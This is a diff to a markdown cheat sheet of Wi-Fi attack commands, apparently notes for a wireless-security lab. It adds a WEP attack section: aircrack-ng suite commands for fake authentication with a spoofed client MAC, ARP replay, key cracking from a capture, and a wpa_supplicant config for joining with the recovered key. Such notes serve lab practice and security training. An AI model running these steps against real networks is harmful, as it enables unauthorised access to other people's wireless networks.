@@ -73,6 +73,35 @@ sudo apt install airgeddon
 source /usr/share/airgeddon/known_pins.db
 echo ${PINDB["0013F7"]}
 ```
+## WEP Attack 
+https://www.aircrack-ng.org/doku.php?id=simple_wep_crack
+```
+sudo airodump-ng wlan0mon
+sudo aireplay-ng -1 0 -e groupB_target_7 -a 9C:EF:D5:FB:07:AC -h 50:02:91:69:82:F9 wlan0mon
+-1 = fake auth, -e = essid, -a = bssid, -h = client mac
+sudo aireplay-ng -1 6000 -o 1 -q 10 -e groupB_target_7 -a 9C:EF:D5:FB:07:AC -h 50:02:91:69:82:F9 wlan0mon
+-1 6000 = fake auth every 6000 seconds, -o = send one packet at a time, -q = keep alive every 10 seconds
+if fails, deauth
+
+sudo aireplay-ng -3 -b 9C:EF:D5:FB:07:AC -h 50:02:91:69:82:F9 wlan0mon
+-3 = ARP replay, -b = bssid, -h = client
+
+sudo aircrack-ng -b 9C:EF:D5:FB:07:AC wep.txt-01.cap
+Look for [H:E:X:K:E:Y]
+
+wpa_supplicant_WEP.conf
+
+network={
+        ssid="<ssid>"
+        key_mgmt=NONE
+        wep_key0=<key>  # do not use : in the key
+        wep_tx_keyidx=0
+}
+
+sudo airmon-ng stop wlan0mon
+sudo wpa_supplicant -i wlan0 -c wep_supplicant
+sudo dhclient wlan0
+```
 ## Aircrack-ng
 ```
 aircrack-ng -w [path to wordlist] -e [ESSID] -b [BSSID] [file.cap]
